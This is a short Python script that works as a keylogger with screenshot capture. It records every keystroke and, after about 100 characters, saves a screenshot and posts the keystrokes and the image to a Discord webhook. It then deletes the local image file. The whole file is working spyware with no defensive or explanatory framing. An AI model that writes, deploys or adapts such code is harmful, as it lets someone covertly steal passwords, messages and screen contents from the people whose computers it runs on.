import keyboard
import requests
import json
import os
from PIL import ImageGrab

WEBHOOK_URL = 'https://discord.com/api/webhooks/WEBHOOK_ID/TOKEN'

log = ''

def on_key(event):
    global log
    log += str(event)
    log += '\n'

keyboard.hook(on_key)

while True:
    if len(log) > 100:
        screenshot = ImageGrab.grab()
        screenshot_path = os.getcwd() + '\\screenshot.jpg'
        screenshot.save(screenshot_path)
        files = {'image': open(screenshot_path, 'rb')}
        data = {'content': log}
        result = requests.post(WEBHOOK_URL, data=data, files=files)
        log = ''
        os.remove(screenshot_path)
